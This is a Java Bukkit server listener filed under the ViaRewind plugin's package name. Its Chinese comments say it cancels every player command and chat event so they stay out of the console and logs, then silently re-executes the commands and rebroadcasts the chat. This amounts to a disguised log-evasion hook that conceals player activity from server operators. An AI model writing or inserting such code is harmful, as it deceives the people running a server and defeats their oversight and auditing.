package com.viaversion.viarewind.handlers;

import org.bukkit.event.EventHandler;
import org.bukkit.Bukkit;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class CommandListener implements Listener {

    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        // 获取命令
        String command = event.getMessage();

        // 取消事件，这样命令不会显示在控制台或日志中
        event.setCancelled(true);
        
        // 手动执行命令，但不显示在日志中
        event.getPlayer().performCommand(command.substring(1));
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        // 获取聊天信息
        String message = event.getMessage();
        String format = event.getFormat();
        String playerName = event.getPlayer().getName();

        // 取消事件，这样聊天信息不会显示在控制台或记录到日志
        event.setCancelled(true);

        // 手动将消息发送给所有在线玩家
        String formattedMessage = String.format(format, playerName, message);
        Bukkit.getServer().getOnlinePlayers().forEach(player -> player.sendMessage(formattedMessage));
    }
}
